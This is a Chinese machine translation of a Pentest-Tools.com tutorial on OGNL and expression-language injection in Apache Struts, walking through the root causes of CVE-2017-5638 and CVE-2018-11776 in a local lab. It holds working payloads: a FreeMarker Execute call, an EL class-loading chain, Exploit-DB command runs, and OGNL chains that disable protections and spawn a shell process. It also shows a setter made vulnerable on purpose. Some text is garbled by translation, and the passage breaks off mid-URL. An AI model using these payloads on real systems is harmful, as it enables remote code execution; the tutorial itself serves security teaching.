<html>
<head>
<title>Exploiting OGNL Injection in Apache Struts | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>在Apache Struts中利用OGNL注入| Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts#2023-02-21T15:46:42.000Z">https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts#2023-02-21T15:46:42.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>让我们理解OGNL注入在Apache Struts中是如何工作的。我们将以Struts中的两个关键漏洞为例:<a target="_blank" rel="external nofollow noopener noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5638"> CVE-2017-5638 </a> (Equifax违规)和<a target="_blank" rel="external nofollow noopener noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2018-11776"> CVE-2018-11776 </a>。</p><p>Apache Struts是一个免费的开源框架，用于创建优雅的现代Java web应用程序。它有自己的关键漏洞，其中一个功能，OGNL——对象图导航语言，是许多漏洞的核心。</p><p>其中一个漏洞(CVE-2017-5638)促成了2017年的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Equifax"> Equifax </a>泄露事件，该事件暴露了超过1.45亿美国公民的个人信息。尽管是一家年收入超过30亿美元的公司，但它却被Apache Struts模型-视图-控制器(MVC)框架中的一个已知漏洞攻击。</p><p>本文简要介绍了Apache Struts，然后将引导您修改一个简单的应用程序，使用OGNL，并利用它。接下来，它将深入一些针对该平台的公开攻击，并使用OGNL注入缺陷来了解这类漏洞。</p><p>即使Java开发人员熟悉Apache Struts，但在安全社区中往往不是这样。这就是我们创建这篇博客的原因。</p><h2 id="contents">内容</h2><p>请随意使用下面的菜单跳到感兴趣的部分。</p><ol start="1"><li><p><strong>安装Apache Tomcat服务器(<a href="#1-getting-started">入门</a> ) </strong></p></li><li><p><strong>熟悉Java应用在服务器上的工作方式(<a href="#2-web-server-basics">网络服务器基础</a> ) </strong></p></li><li><p><strong>一看一个Struts app ( <a href="#3-struts-application-example"> Struts应用实例</a> ) </strong></p></li><li><p><strong>表情语言注射(<a href="#4-expression-language-injection">表情语言注射</a> ) </strong></p></li><li><p><strong>了解OGNL注入(<a href="#5-object-graph-navigation-language-injection">对象图导航语言注入</a> ) </strong></p></li><li><p><strong>CVE-2017-5638根本原因(<a href="#6-cve-2017-5638-root-cause"> CVE-2017-5638根本原因</a> ) </strong></p></li><li><p><strong>CVE-2018-11776根本原因(<a href="#7-cve-2018-11776-root-cause">)CVE-2018-11776根本原因</a> ) </strong></p></li><li><p><strong>解释OGNL喷射有效载荷(<a href="#8-understanding-ognl-injection-payloads">了解OGNL喷射有效载荷</a> ) </strong></p></li></ol><h2 id="1-getting-started">1.入门指南</h2><p>运行易受攻击的Struts应用程序需要安装Apache Tomcat web服务器。该软件包的最新版本可以从<a target="_blank" rel="external nofollow noopener noreferrer" href="https://tomcat.apache.org/download-90.cgi">下载，这里是</a>的ZIP存档。将二进制文件解压到您选择的位置(我们使用/var/tomcat ),然后继续:</p><div class="content-highlight"><pre class="code-block"><code>cd /var/tomcat/bin # Go to the extracted folder
chmod +x *.sh      # Set scripts as executable
./startup.sh       # Run the startup script</code></pre></div><p>转到<code>http://localhost:8080/</code>并检查它是否正在运行。</p><p>如果是这样的话，我们准备下载一个旧版本的Apache Struts框架，它容易受到我们想要演示的攻击。<a target="_blank" rel="external nofollow noopener noreferrer" href="https://archive.apache.org/dist/struts/2.3.30/">这个页面</a>提供了符合我们需求的Struts版本2.3.30。</p><p>提取了归档文件的内容后，您应该在/ <code>apps</code>位置下有文件<code>struts2-showcase.war</code> &gt;。这是编译好的，准备部署一个使用Struts的演示应用程序。只需将WAR文件复制到<code>/var/tomcat/webapps</code>中，进入http://localhost:8080/struts 2-showcase/showcase . action查看是否有效。</p><h2 id="2-web-server-basics">2.Web服务器基础</h2><p>如果您很好地掌握了与Java web应用程序相关的简单概念，比如servlets，那么您已经领先了。如果你对<a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Java_servlet"> Java servlet </a>一无所知，可以说它们是一些组件，目的是创建web容器，用于在<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/website-vulnerability-scanning/website-scanner"> web服务器</a>上托管web应用程序；他们还处理对像<code>/struts2-showcase</code>这样的Java应用的请求。</p><p>为了处理servlets，web服务器(例如Apache Tomcat)需要一些组件:</p><ul><li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Apache_Tomcat#Coyote"> Apache Coyote </a>是支持HTTP/1.1协议的连接器。它允许与servlet容器组件Apache Catalina进行通信。</p></li><li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Apache_Tomcat#Catalina"> Apache Catalina </a>容器决定当Tomcat接收HTTP请求时需要调用哪些servlets。它还将HTTP请求和响应从文本转换成servlets使用的Java对象。</p></li></ul><p><img src="../Images/559ef35e727e716f1a5eca59271f790f.png" alt="tomcat architecture described" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1vZ25sLWluamVjdGlvbi1pbi1hcGFjaGUtc3RydXRzLzEtdG9tY2F0LWFyY2hpdGVjdHVyZS5wbmc=?s=5bb66e5858a2e011d13520557a77eeb6"/>你可以在这里<a target="_blank" rel="external nofollow noopener noreferrer" href="https://jcp.org/aboutJava/communityprocess/final/jsr369/index.html">找到</a>关于Java servlet规范的所有细节(最新版本是4.0)。</p><h3 id="apache-struts-basics">Apache Struts基础</h3><p>像Java web应用程序一样，使用Apache Struts框架的应用程序可以有多个servlets。全面理解这个框架来构建web应用程序并不在本文的讨论范围之内，本文只涉及了一些基本概念。你可以通过<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.tutorialspoint.com/struts_2/index.htm">循序渐进的教程</a>来扩展你的知识。</p><p>Apache Struts框架依赖于MVC ( <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller">模型-视图-控制器</a>)架构模式。它对应用程序很有用，因为它可以分离<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.tutorialspoint.com/struts_2/struts_architecture.htm">主要应用程序组件</a>:</p><ul><li><p><strong>Model</strong>–表示应用程序数据，例如，处理“订单”等数据的类</p></li><li><p><strong>视图</strong>–是应用程序的输出，可视化部分</p></li><li><p><strong>控制器</strong>–接收用户输入，使用模型生成视图</p></li><li><p><strong>动作</strong>–Apache Struts中的模型</p></li><li><p><strong>拦截器</strong>——控制器的一部分，这些是钩子，可以在处理请求之前或之后调用</p></li><li><p><strong>值堆栈/OGNL</strong>–一堆对象，如模型或动作对象</p></li><li><p><strong>结果/结果类型</strong>–用于选择业务逻辑后的视图</p></li><li><p><strong>查看技术</strong>–处理数据的显示方式</p></li></ul><p>下面你可以看到Apache Struts web应用程序的一般架构:</p><p><img src="../Images/4854c502b693dc22edd964c1316c1231.png" alt="the structure of Apache Struts web application" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1vZ25sLWluamVjdGlvbi1pbi1hcGFjaGUtc3RydXRzL2FwYWNoZS1zdHJ1dHMtd2ViLWFwcGxpY2F0aW9uLmpwZw==?s=cfc51a968e1ea7e0c50ac94831c6c937"/>控制器接收到一个<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/exploit-helpers/http-request-logger"> HTTP请求</a>，而<em> FilterDispatcher </em>负责根据请求调用正确的动作。然后执行操作，视图组件准备结果并在HTTP响应中将其发送给用户。</p><h2 id="3-struts-application-example">3.Struts应用程序示例</h2><p>从头编写一个Struts应用程序需要一些时间，所以我们将使用一个已经可用的rest-showcase演示应用程序，它是一个简单的带有基本前端的REST API。要编译应用程序，我们只需将<em> cd </em>放入其目录，并使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://maven.apache.org/"> Maven </a>构建它:</p><div class="content-highlight"><pre class="code-block"><code>cd struts-2.3.30/src/apps/rest-showcase/
mvn package</code></pre></div><p>在<em>目标</em>目录中，我们应该会找到以下文件:<code>struts2-rest-showcase.war</code>。你可以把文件复制到Tomcat服务器的<em> web app </em> s目录下安装，比如<code>/var/tomcat/webapps</code>。</p><p>这是应用程序的源代码:</p><p><img src="../Images/058e6999335d2b3fe188b1240a777402.png" alt="the source code of a Struts application" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1vZ25sLWluamVjdGlvbi1pbi1hcGFjaGUtc3RydXRzLzMtMS1hcHAtc291cmNlLWNvZGUucG5n?s=994084a235fa8cb8d38a5e8c01b89509"/> 1。<code>Order.java</code>是<strong>的型号</strong>。它是一个存储订单信息的Java类。</p><div class="content-highlight"><pre class="code-block"><code>public class Order {
    String id;
    String clientName;
    int amount;
    …
}</code></pre></div><p>2.<code>OrdersService.java</code>是一个助手类，它将订单存储在HashMap中并管理它们。</p><div class="content-highlight"><pre class="code-block"><code>public class OrdersService {
    private static Map&lt;String,Order&gt; orders = new HashMap&lt;String,Order&gt;();
    …
}</code></pre></div><p>3.OrderController.java和T4是Struts应用程序的动作控制器。</p><p>4.我们还可以看到代表<strong>视图</strong>的多个JSP文件。</p><p>5.以及<code>web.xml</code>、<code>struts.xml</code>等配置文件。</p><h3 id="server-side-templates-and-injection">服务器端模板和注入</h3><p>JSP通过混合静态HTML和在服务器上执行的动态代码来生成动态HTML代码。类似于PHP，可以混合Java和HTML代码。下面是一个<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.tutorialspoint.com/jsp/jsp_form_processing.htm">的例子</a>:</p><div class="content-highlight"><pre class="code-block"><code>&lt;li&gt;&lt;p&gt;&lt;b&gt;First Name:&lt;/b&gt;
&lt;%= request.getParameter("first_name")%&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;b&gt;Last  Name:&lt;/b&gt;
&lt;%= request.getParameter("last_name")%&gt;
&lt;/p&gt;&lt;/li&gt;</code></pre></div><p>如上面的代码片段所示，我们可以在HTML代码中使用<code>request</code>对象，并调用<strong> getParameter </strong>函数，该函数返回参数<em> first_name </em>和<em> last_name </em>的值。</p><p>为了遵循MVC设计模式并避免视图(JSP)和模型/控制器(Java)之间的复杂混合，可以在JSP文件中使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Unified_Expression_Language">表达式语言</a>。这是一种特殊的编程语言，使视图能够与Java应用程序通信:</p><p>盒子周长为:$ { 2<em>box . width+2</em>box . height }</p><p>这个功能也被称为<strong>服务器端模板</strong>，因为它允许在服务器上创建HTML <em>模板</em>，以便于管理HTML和Java代码的混合。有多种服务器端模板引擎可用，如FreeMarker、Velocity或Thymeleaf。</p><p>在这一点上，我们不仅在后端有Java，而且通过模板引擎有一些特殊的编程语言，这可能是<a target="_blank" rel="external nofollow noopener noreferrer" href="https://portswigger.net/blog/server-side-template-injection">服务器端模板注入</a>漏洞的适当基础。</p><p>与其他漏洞一样，问题发生在模板引擎解析或解释用户提供的数据时。由于它们的实用性在于它们提供的许多特性，模板引擎通常包括一个调用函数的方法，这为执行操作系统命令打开了大门。</p><p>使用FreeMarker模板引擎检查此示例:</p><div class="content-highlight"><pre class="code-block"><code>&lt;head&gt;
&lt;title&gt;${title}&lt;/title&gt;
&lt;/head&gt;
…
&lt;#if animals.python.price == 0&gt;
Pythons are free today!
&lt;/#if&gt;</code></pre></div><p>在上面的代码中，有一个动态生成的标题，如果满足某个条件，还会显示一条消息。</p><p>攻击者可以打印动态内容，这可能是应用程序配置数据等敏感信息。此外，如果模板引擎允许，攻击者可以执行操作系统命令。怎么会？通过滥用模板引擎的功能。以下是FreeMarker的一个示例:</p><div class="content-highlight"><pre class="code-block"><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("id") }</code></pre></div><h2 id="4-expression-language-injection">4.表达式语言注入</h2><p>表达式语言用于创建服务器端模板，正因为如此，它也可以被视为服务器端模板引擎。但是，由于它也满足其他目的，它的漏洞严格来说不是注入类型。以下是一些<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.oracle.com/javaee/5/tutorial/doc/bnahq.html">例子</a>:</p><div class="content-highlight"><pre class="code-block"><code>${customer.address["street"]}
${mySuit == "hearts"}
${customer.age + 20}
#{customer.age}
${requestScope[’javax.servlet.forward.servlet_path’]}</code></pre></div><p>用户可能能够执行用户提供的表达式语言代码，因此这意味着应用程序可能容易受到表达式语言注入的攻击。正如这篇<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf">论文</a>所解释的，因为使用了<code>${EL}</code>语法，表达式语言的缺陷很容易被发现。例如，一个简单的数学运算，如<code>${9999+1}</code>将被计算为<code>10000</code>，这可能在响应中可见。</p><p>即使这对攻击者来说不是很有用，也可以使用表达式语言的默认范围来检索实际信息，例如＄{ application scope }或＄{ request scope }。</p><p>进一步来看<a target="_blank" rel="external nofollow noopener noreferrer" href="http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/"/>，表达式语言注入可以允许会话对象修改，并将用户权限提升到管理员级别:</p><div class="content-highlight"><pre class="code-block"><code>${pageContext.request.getSession().setAttribute("admin",true)}</code></pre></div><p>最后，甚至有可能远程执行代码，如下所示:</p><div class="content-highlight"><pre class="code-block"><code>${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute("arr").toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass("Malicious").newInstance()}</code></pre></div><p>通过拒绝用户向表达式语言解析函数提供的输入，保持所有依赖关系的更新，甚至通过在可能的情况下从用户输入中正确转义<code>#{</code>和<code>${</code>序列，可以防止这种类型的漏洞。</p><h2 id="5-object-graph-navigation-language-injection">5.对象图导航语言注入</h2><p>对象图导航语言(<a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/OGNL"> OGNL </a>)是一种面向Java的开源表达式语言。OGNL的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://commons.apache.org/proper/commons-ognl/index.html">主要功能</a>是获取和设置对象属性:“<em>你在Java中能做的大部分事情在OGNL都是可能的</em>”</p><p>如果我们要处理订单，如下所述，</p><div class="content-highlight"><pre class="code-block"><code>public class Order {
    String id;
    String clientName;
    int amount;
    …
}</code></pre></div><p>在JSP文件中可以直接访问订单属性，如下所示:</p><div class="content-highlight"><pre class="code-block"><code>&lt;!DOCTYPE html&gt;
&lt;%@taglib prefix="s" uri="/struts-tags" %&gt;
...
&lt;s:form method="post" action=`**`%{#request.contextPath}/orders/%{id}`**` cssClass="form-horizontal" theme="simple"&gt;
&lt;s:hidden name="_method" value="put" /&gt;`
ID
`&lt;s:textfield id=`**`"id"`**` name="id" disabled="true" cssClass="form-control"/&gt;`
Client
`&lt;s:textfield id=`**`"clientName"`**` name="clientName" cssClass="form-control"/&gt;`
Amount
`&lt;s:textfield id=`**`"amount"`**` name="amount" cssClass="form-control" /&gt;
&lt;s:submit cssClass="btn btn-primary"/&gt;
&lt;/s:form&gt;</code></pre></div><p>使用<code>%{code}</code>和<code>${code}</code>序列评估OGNL表达式。如其<a target="_blank" rel="external nofollow noopener noreferrer" href="https://commons.apache.org/proper/commons-ognl/language-guide.html">文件</a>所述，OGNL允许:</p><ul><li><p>访问属性，如<code>name</code>或<code>headline.text</code></p></li><li><p>调用方法如<code>toCharArray()</code></p></li><li><p>从数组中访问元素，如<code>listeners[0]</code></p></li><li><p>或者甚至把它们结合起来:<code>name.toCharArray()[0].numericValue.toString()</code></p></li></ul><p>也可以使用变量(<code>#var = 99</code>)，创建数组(<code>new int[] { 1, 2, 3 }</code>)或者映射(<code>#@java.util.LinkedHashMap@{ "foo" : "foo value", "bar" : "bar value" }</code>)，甚至访问静态字段(<code>@class@field</code>或者调用静态方法:<code>@class@method(args)</code>)。</p><p>OGNL是一种强大的语言，但是在Apache Struts中将用户提供的输入视为OGNL会影响安全性。让我们举一个简单的例子，在rest-showcase应用程序中引入一个漏洞。</p><p>对于所有的<code>Order</code>属性，我们都有getters和setters，例如:</p><div class="content-highlight"><pre class="code-block"><code>public String getClientName() {
    return clientName;
}
public void setClientName(String clientName) {
    this.clientName = clientName;
}</code></pre></div><p>通过导入三个额外的包并调用<code>TextParseUtil.translateVariables</code>方法，可以修改setter使其易受OGNL注入的攻击，然后该方法将对其进行评估。在我们的例子中，修改检查了<code>clientName</code>参数中的值。</p><div class="content-highlight"><pre class="code-block"><code>import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.util.TextParseUtil;
import com.opensymphony.xwork2.util.reflection.ReflectionContextState;
…</code></pre></div><div class="content-highlight"><pre class="code-block"><code>public void setClientName(String clientName) {
    ReflectionContextState.`**`setDenyMethodExecution`**`(ActionContext.getContext().getContextMap(), false);`
    `this.clientName = `**`TextParseUtil.translateVariables`**`(clientName, ActionContext.getContext().getValueStack());</code></pre></div><p><code>translateVariables</code>方法到达如下代码:</p><div class="content-highlight"><pre class="code-block"><code>TextParser parser = ((Container)stack.getContext().get(ActionContext.CONTAINER)).getInstance(TextParser.class);
return `**parser.evaluate**`(openChars, expression, ognlEval, maxLoopCount);</code></pre></div><p>这将计算OGNL表达式(OgnlTextParser.java)。</p><p>接下来，我们可以重新编译应用程序，启动它，并尝试利用<code>clientName</code>参数中的漏洞。测试这个的最简单的方法是使用一个简单的数学运算，比如<code>%{999+1}</code>。</p><p><img src="../Images/c882be842cbe942d34ae63d4be36ff52.png" alt="exploiting the vulnerability in the client Name parameter " loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1vZ25sLWluamVjdGlvbi1pbi1hcGFjaGUtc3RydXRzLzQtZXZhbHVhdGUtb2dubC1leHByZXNzaW9uLnBuZw==?s=5d6b57183c7036fcc8842947a9aee87f"/>修改订单后，客户端名称将被解析为OGNL，通过成功执行数学运算来确认。</p><p><img src="../Images/d894460ecd2b09b3c98a3413211ffa79.png" alt="the successful execution of the client's name" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1vZ25sLWluamVjdGlvbi1pbi1hcGFjaGUtc3RydXRzLzUtbW9kaWZ5LW9yZGVyLnBuZw==?s=22aa926f764c92f50838ee869de16bbb"/>现在我们知道参数是易受攻击的，我们可以在测试中使用它。有一点需要注意，在调用<code>translateVariables</code>函数之前，我们调用<code>setDenyMethodExecution</code>。这是必要的，因为当设置参数值时，正如我们在这里所做的，作为一种保护措施，<em>方法执行</em>被拒绝，我们将不能执行任何方法。</p><p>如果在利用阶段，您在类似的地方遇到漏洞，则可以在任何方法调用之前直接从有效负载启用方法执行:</p><div class="content-highlight"><pre class="code-block"><code>(#context['xwork.MethodAccessor.denyMethodExecution']=false)</code></pre></div><p>谢谢，<a target="_blank" rel="external nofollow noopener noreferrer" href="https://twitter.com/mmolgtm"> mmolgtm </a>指出这一点！</p><h3 id="debugging-java-applications">调试Java应用程序</h3><p>在IDE的内置调试器中运行Java应用程序可以提高对应用程序和漏洞的理解，因为它提供了一个关于漏洞如何工作的清晰、逐步的视图。</p><p>调试易受攻击的应用程序的好处包括能够在代码中的任何位置设置断点，以及检查和修改所有变量。</p><p>使用旧的Java应用程序，如Struts 2.3.30，可能需要更改一些设置，以便在调试器中编译和运行它。以下是一些建议:</p><ol start="1"><li><p>进入<strong>运行&gt;调试&gt;编辑配置</strong></p></li><li><p>点击<strong> + </strong>，选择<strong> Maven </strong></p></li><li><p>通过选择Maven项目来指定工作目录，比如<em> rest-showcase </em></p></li><li><p>指定下面的命令行:<code>jetty:run -f pom.xml</code> (Jetty是一个web服务器)</p></li></ol><p>在<code>setClientName</code>方法上设置断点现在很简单:打开浏览器<a target="_blank" rel="external nofollow noopener noreferrer" href="http://127.0.0.1:8080/struts2-rest-showcase/orders.xhtml">http://127 . 0 . 0 . 1:8080/struts 2-rest-showcase/orders . XHTML</a>，选择其中一个订单的<strong> Edit </strong>，按<strong> Submit </strong>编辑订单。这将触发对<code>setClientName</code>的调用，并命中断点。</p><h2 id="6-cve-2017-5638-root-cause">6.CVE-2017-5638根本原因</h2><p><strong> CVE-2017-5638 </strong>是Struts中公开最多的漏洞，主要是因为它被用于<strong> Equifax </strong>数据泄露。安全社区仔细看了一下，这里只是<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html">两个</a>T23】的例子。</p><p>漏洞可从<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/41570/"> Exploit-DB </a>下载并运行:</p><div class="content-highlight"><pre class="code-block"><code>python CVE-2017-5638.py http://localhost:8080/struts2-showcase/showcase.action "touch /tmp/pwned"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: touch /tmp/pwned</code></pre></div><p>结果应该是在“/tmp/pwned”位置创建一个文件:</p><p>CVE-2017-5638的问题是框架和使用它的应用程序不需要做任何事情，它代表了最坏的情况。</p><p>调试器是了解漏洞来源的最快方法。使用它在translateVariables方法上放置一个断点，利用此漏洞调用该方法，并运行公共利用。</p><div class="content-highlight"><pre class="code-block"><code>python CVE-5638.py http://127.0.0.1:8080/struts2-rest-showcase/ 'ls -la /'</code></pre></div><p>这提供了对完整堆栈跟踪的查看，包括所有需要的数据。下面是结果:</p><p>如果我们浏览堆栈，我们可以清楚地看到正在发生的事情。</p><ol start="1"><li><p>它在调用prepare.wrapRequest(request)的<code>doFilter(…)</code>方法中处理请求；方法</p></li><li><p><code>wrapRequest</code>呼叫<code>dispatcher.wrapRequest(request);</code></p></li><li><p>而在这种方法中，我们可以发现一些有趣的东西:</p></li></ol><div class="content-highlight"><pre class="code-block"><code>String contenttype = request.getContentType(); if (contenttype != null &amp;&amp; content_type.contains("multipart/form-data")) {
    request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);`} else {
    request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);
}</code></pre></div><p>如果请求的<code>Content-Type</code>头包含<code>multipart/form-data</code>字符串，框架将使用<strong>MultiPartRequestWrapper</strong>类。</p><ol start="1"><li><p>接下来解析请求:multi.parse(request，saveDir)；</p></li><li><p>此方法尝试解析请求，但是当它发现Content-Type无效时将引发异常:</p></li></ol><div class="content-highlight"><pre class="code-block"><code>if ((null == contentType) || ( !contentType.toLowerCase(Locale.ENGLISH).startsWith(MULTIPART))) { throw new InvalidContentTypeException( format("the request doesn't contain a %s or %s stream, content type header is %s", MULTIPARTFORMDATA, MULTIPART_MIXED, contentType));</code></pre></div><ol start="1"><li><p>这个异常导致对执行以下方法的<code>buildErrorMessage</code>的调用:<strong>localized textutil . find text</strong>(this . getclass()，errorKey，defaultLocale，<strong> e.getMessage() </strong>，args)；(其中<strong> e.getMessage() </strong>是包含漏洞的错误消息)</p></li><li><p>这导致调用return <code>findText(aClass, aTextName, locale, defaultMessage, args, valueStack);</code></p></li><li><p>然后调用<code>result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);</code></p></li><li><p>接下来，将有一个调用执行异常:<code>MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);</code></p></li><li><p>以及将执行异常的“translateVariables”方法:请求不包含multipart/form-data或multipart/mixed stream，内容类型头为%{(# <em> ='multipart/form-data ')。(#dm=@ognl。OgnlContext @ DEFAULT</em>MEMBER _ ACCESS)…</p></li></ol><p>最后，总体思路很简单:一个带有OGNL表达式的无效<code>Content-Type</code>头触发CVE-2017-5638。出于某种原因，带有OGNL表达式的异常消息被解析。</p><h2 id="7-cve-2018-11776-root-cause">7.CVE-2018-11776根本原因</h2><p>为了利用这个漏洞，我们需要Struts 2.5.16，可以用ZIP格式<a href="https://archive.apache.org/dist/struts/2.5.16/" rel="external nofollow noopener noreferrer">在这里</a>。如这里的<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-part2" rel="external nofollow noopener noreferrer">或这里的</a>或<a href="https://github.com/jas502n/St2-057" rel="external nofollow noopener noreferrer">所述，在定制配置下可以成功利用它:</a></p><ol start="1"><li><p>转到struts-2.5.16目录:<code>cd struts-2.5.16/</code></p></li><li><p>并搜索以下文件<em>struts-action chaining . XML</em>:<code>find . -name struts-actionchaining.xml</code></p></li><li><p>编辑XML文件，如<code>./src/apps/showcase/src/main/resources/struts-actionchaining.xml</code></p></li><li><p>并修改&lt; 【T13】 &gt; tag to have the following value:</p></li></ol><div class="content-highlight"><pre class="code-block"><code>&lt;struts&gt;
  &lt;package name="actionchaining" extends="struts-default"&gt;
    &lt;action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1"&gt;
      &lt;result type="redirectAction"&gt;
        &lt;param name = "actionName"&gt;register2&lt;/param&gt;
      &lt;/result&gt;
    &lt;/action&gt;
  &lt;/package&gt;
&lt;/struts&gt;</code></pre></div><p>This allows us to use the <strong> struts2-showcase </strong>应用作为目标。要编译它，必须执行以下步骤:</p><ol start="1"><li><p><code>cd src/apps/showcase/</code> #转到Showcase目录</p></li><li><p>编译它(并跳过测试)</p></li><li><p><code>cp target/struts2-showcase.war /var/tomcat/webapps/</code> #复制到Tomcat</p></li></ol><p>现在，我们可以通过在web浏览器中加载以下内容来检查应用程序是否易受攻击:</p><p><code>http://127.0.0.1:8080/struts2-showcase/${22+22}/actionChain1.action</code></p><p>我们应该会重定向到<a href="http://127.0.0.1:8080/struts2-showcase/44/register2.action" rel="external nofollow noopener noreferrer">http://127 . 0 . 0 . 1:8080/struts 2-showcase/</a><a href="http://127.0.0.1:8080/struts2-showcase/44/register2.action" rel="external nofollow noopener noreferrer"><strong>44</strong></a><a href="http://127.0.0.1:8080/struts2-showcase/44/register2.action" rel="external nofollow noopener noreferrer">/register 2 . action</a></p><p>包含大量技术实现细节的工作漏洞可在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit">这里</a>获得。为了利用这个漏洞，我们使用了用C语言编写的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Semmle/SecurityExploits/blob/master/Apache/Struts/CVE-2018-11776/struts-attacker/src/startcalc.c">漏洞。</a></p><p>我们需要发送两个请求，并在URL中编码以下有效负载:</p><div class="content-highlight"><pre class="code-block"><code>1.${(#_=#attr['struts.valueStack']).(#context=#_.getContext()).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}</code></pre></div><div class="content-highlight"><pre class="code-block"><code>2.${(#_=#attr['struts.valueStack']).(#context=#_.getContext()).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#context.setMemberAccess(#dm)).(#sl=@java.io.File@separator).(#p=new java.lang.ProcessBuilder({'bash','-c',**'xcalc'**})).(#p.start())}</code></pre></div><p>利用是这样发生的:</p><div class="content-highlight"><pre class="code-block"><code>3. http://127.0.0.1:8080/struts2-showcase/%24%7B%28%23_%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23context%3D%23_  .getContext%28%29%29.%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container

%27%5D%29.%28%23ognlUtil%3D%23container

.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.setExcludedClasses

%28%27%27%29%29.%28%23ognlUtil

.setExcludedPackageNames%28%27%27%29%29%7D/actionChain1.action](http://127.0.0.1:8080/struts2-showcase/$%7B(%23_%3D%23attr%5B'struts.valueStack'%5D)

.(%23context%3D%23_.getContext()).(%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).
(%23ognlUtil%3D%23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).

(%23ognlUtil.setExcludedClasses('')).

(%23ognlUtil.setExcludedPackageNames(''))%7D/actionChain1.action)</code></pre></div><div class="content-highlight"><pre class="code-block"><code>4. http://127.0.0.1:8080/struts2-showcase/%24%7B%28%23_%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23context%3D%23_

.getContext%28%29%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23context.setMemberAccess%28%23dm%29%29.%28%23sl%3D%40java.io

.File%40separator%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%7B%27bash%27%2C%27-c%27%2C%27xcalc%27%7D%29%29.%28%23p.start%28%29%29%7D/actionChain1.action</code></pre></div><div class="content-highlight"><pre class="code-block"><code>http://127.0.0.1:8080/struts2-showcase/$%7B(%23_%3D%23attr%5B'struts.valueStack'%5D).(%23context%3D%23_.getContext()).(%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)

